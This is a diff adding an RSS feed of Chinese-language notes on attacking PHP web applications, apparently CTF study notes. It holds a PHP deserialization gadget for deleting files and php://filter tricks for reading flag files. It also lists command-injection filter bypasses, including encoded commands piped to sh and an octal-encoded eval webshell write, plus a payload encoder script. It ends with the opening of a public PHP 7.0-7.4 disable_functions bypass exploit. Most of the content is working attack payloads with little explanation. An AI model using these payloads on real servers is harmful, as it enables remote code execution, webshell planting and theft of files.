@@ -1,0 +1,898 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>php on Alex lan</title><link>http://localhost:1313/docs/network-security/php/</link><description>Recent content in php on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/docs/network-security/php/index.xml" rel="self" type="application/rss+xml"/><item><title>php</title><link>http://localhost:1313/docs/network-security/php/php/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php/</guid><description>&lt;h2 id="zip">
+ Zip
+ &lt;a class="anchor" href="#zip">#&lt;/a>
+&lt;/h2>
+&lt;h4 id="利用-ziparchive-内置类的open方法达到删除文件效果">
+ 利用 ZipArchive 内置类的open方法达到删除文件效果
+ &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8-ziparchive-%e5%86%85%e7%bd%ae%e7%b1%bb%e7%9a%84open%e6%96%b9%e6%b3%95%e8%be%be%e5%88%b0%e5%88%a0%e9%99%a4%e6%96%87%e4%bb%b6%e6%95%88%e6%9e%9c">#&lt;/a>
+&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Jesen&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $filename&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;11.php&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $content&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $me;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Jesen&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">me&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ZipArchive&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">serialize&lt;/span>($a);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="base64">
+ base64
+ &lt;a class="anchor" href="#base64">#&lt;/a>
+&lt;/h2>
+&lt;p>文件包含过滤了base,用其他编码，不行多试几个&lt;/p>
+&lt;pre tabindex="0">&lt;code>UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+EUC-JP*
+SJIS*
+eucJP-win*
+SJIS-win*
+...
+\\具体支持的编码可见php官方文档
+\\https://www.php.net/manual/zh/mbstring.supported-encodings.php
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>php://filter/convert.base64-encode/resource=
+&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>php://filter//convert.iconv.EUC-JP*.UCS-4*/resource=flag.php
+&lt;/code>&lt;/pre></description></item><item><title>php</title><link>http://localhost:1313/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;h2 id="反序列化">
+ 反序列化
+ &lt;a class="anchor" href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96">#&lt;/a>
+&lt;/h2>
+&lt;p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。&lt;/p>
+&lt;p>两个函数&lt;/p>
+&lt;p>serialize 将对象格式化成有序的字符串&lt;/p>
+&lt;p>unserialize 将字符串还原成原来的对象&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $b;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> __construct(){$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;xiaoshizi&amp;#34;&lt;/span>;$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;laoshizi&amp;#34;&lt;/span>;}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">happy&lt;/span>(){&lt;span style="color:#66d9ef">return&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>;}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">serialize&lt;/span>($a);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出&lt;/p>
+&lt;pre tabindex="0">&lt;code>O:4:&amp;#34;test&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;xiaoshizi&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:8:&amp;#34;laoshizi&amp;#34;;}
+&lt;/code>&lt;/pre>&lt;p>序列化后字符串的格式&lt;/p>
+&lt;pre tabindex="0">&lt;code>O:4:&amp;#34;对象名&amp;#34;:变量数量:{s:变量名长度:&amp;#34;变量名&amp;#34;;s:变量值长度:&amp;#34;变量值&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:8:&amp;#34;laoshizi&amp;#34;;}
+&lt;/code>&lt;/pre>&lt;h2 id="修饰符">
+ 修饰符
+ &lt;a class="anchor" href="#%e4%bf%ae%e9%a5%b0%e7%ac%a6">#&lt;/a>
+&lt;/h2>
+&lt;p>如果变量前的修饰符是protected或private，先将代码的修饰符改为public进行序列化，再做修改&lt;/p>
+&lt;pre tabindex="0">&lt;code>private =&amp;gt;%00class_name%00name 长度+类名长度+2
+protected =&amp;gt;%00*%00name 长度+3
+&lt;/code>&lt;/pre>&lt;p>php7.1+不敏感&lt;/p>
+&lt;p>常见的魔术方法&lt;/p>
+&lt;pre tabindex="0">&lt;code>__wakeup() //执行unserialize()时，先会调用这个函数
+__sleep() //执行serialize()时，先会调用这个函数
+__destruct() //对象被销毁时触发
+__call() //在对象上下文中调用不可访问的方法时触发
+__callStatic() //在静态上下文中调用不可访问的方法时触发
+__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
+__set() //用于将数据写入不可访问的属性
+__isset() //在不可访问的属性上调用isset()或empty()触发
+__unset() //在不可访问的属性上使用unset()时触发
+__toString() //把类当作字符串使用时触发
+__invoke() //当尝试将对象调用为函数时触发
+&lt;/code>&lt;/pre>&lt;h2 id="字符串逃逸">
+ 字符串逃逸
+ &lt;a class="anchor" href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%80%83%e9%80%b8">#&lt;/a>
+&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">repl&lt;/span>($s){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">str_replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hack!&amp;#39;&lt;/span>, $s);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $user&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $pwd&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$u&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">serialize&lt;/span>($a);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> $u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$b&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">unserialize&lt;/span>($u);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> $b&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$b&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">pwd&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出，没问题&lt;/p></description></item><item><title>php命令执行linux绕过</title><link>http://localhost:1313/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/</guid><description>&lt;p>在php中虽然有命令执行，但是过滤了很多，会让我们的难度变大&lt;/p>
+&lt;h2 id="空格">
+ 空格
+ &lt;a class="anchor" href="#%e7%a9%ba%e6%a0%bc">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code>${IFS}
+$IFS$9
+&amp;gt;
+&amp;lt;&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="inode">
+ inode
+ &lt;a class="anchor" href="#inode">#&lt;/a>
+&lt;/h2>
+&lt;p>打印文件的inode号&lt;/p>
+&lt;pre tabindex="0">&lt;code>ls -i
+tac `find / -inum incode号`
+&lt;/code>&lt;/pre>&lt;p>在获取到inode号配合可以查找文件及所有子目录文件并打印&lt;/p>
+&lt;pre tabindex="0">&lt;code>cat `find . -inum inode号`
+&lt;/code>&lt;/pre>&lt;p>在linux 会优先执行反引号中的内容&lt;/p>
+&lt;h2 id="tee">
+ tee
+ &lt;a class="anchor" href="#tee">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code>欲执行命令 | tee 回显文件
+如
+l\s / | tee 1.txt
+
+再访问1.txt
+
+
+关键字被过滤 在中间加\
+&lt;/code>&lt;/pre>&lt;h2 id="cat">
+ cat
+ &lt;a class="anchor" href="#cat">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code>cat、tac、more、less、head、tail、nl、sed、sort、uniq
+&lt;/code>&lt;/pre>&lt;h2 id="编码">
+ 编码
+ &lt;a class="anchor" href="#%e7%bc%96%e7%a0%81">#&lt;/a>
+&lt;/h2>
+&lt;p>用base64，解密并执行&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">bHMgLWwK&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">base64&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">d&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;636174202f666c6167&amp;#34;&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">xxd&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">p&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ascii的八进制编码
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>(&lt;span style="color:#a6e22e">printf&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\154\163&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>) &lt;span style="color:#f92672">--&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>(&lt;span style="color:#a6e22e">printf&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&lt;span style="color:#a6e22e">printf&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>}&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">写shell&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>{&lt;span style="color:#a6e22e">printf&lt;/span>,&lt;span style="color:#a6e22e">\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&lt;/span>&lt;span style="color:#e6db74">&amp;#34;}
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 脚本
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">def encodeOctal(str):
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> # 只显示八进制
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(&amp;#34;&lt;/span>&lt;span style="color:#a6e22e">八进制&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> for i in str:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(oct(ord(i)).replace(&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#a6e22e">o&lt;/span>&lt;span style="color:#e6db74">&amp;#34;, &amp;#34;&lt;/span>&lt;span style="color:#a6e22e">\\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;), end=&amp;#34;&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> # 显示Linux八进制payload
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(&amp;#34;&lt;/span>&lt;span style="color:#a6e22e">\nlinux&lt;/span> &lt;span style="color:#a6e22e">payload&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload = &amp;#39;$(printf&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>IFS&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> for i in str:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload += oct(ord(i)).replace(&amp;#34;0o&amp;#34;, &amp;#34;\\&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload += &amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(payload)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">if __name__ == &amp;#39;__main__&amp;#39;:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> str = &amp;#34;&lt;/span>&lt;span style="color:#a6e22e">cat&lt;/span> &lt;span style="color:#a6e22e">flag_1s_here&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">flag_831b69012c67b35f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> encodeOctal(str)
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>分隔符&lt;/p></description></item><item><title>readflag</title><link>http://localhost:1313/docs/network-security/php/readflag/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/readflag/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Bug: https://bugs.php.net/bug.php?id=76047
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># debug_backtrace() returns a reference to a variable 
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># that has been destroyed, causing a UAF vulnerability.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># This exploit should work on all PHP 7.0-7.4 versions
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># released as of 30/01/2020.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Author: https://github.com/mm0r1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">pwn&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/readflag&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">pwn&lt;/span>($cmd) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> $abc, $helper, $backtrace;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Vuln&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __destruct() { 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> $backtrace; 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">unset&lt;/span>($this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $backtrace &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">getTrace&lt;/span>(); &lt;span style="color:#75715e"># ;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($backtrace[&lt;span style="color:#ae81ff">1&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;args&amp;#39;&lt;/span>])) { &lt;span style="color:#75715e"># PHP &amp;gt;= 7.4
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $backtrace &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">debug_backtrace&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Helper&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a, $b, $c, $d;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>$str, $p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, $s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $address &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($j &lt;span style="color:#f92672">=&lt;/span> $s&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>; $j &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $j&lt;span style="color:#f92672">--&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $address &lt;span style="color:#f92672">&amp;lt;&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $address &lt;span style="color:#f92672">|=&lt;/span> &lt;span style="color:#a6e22e">ord&lt;/span>($str[$p&lt;span style="color:#f92672">+&lt;/span>$j]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $address;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
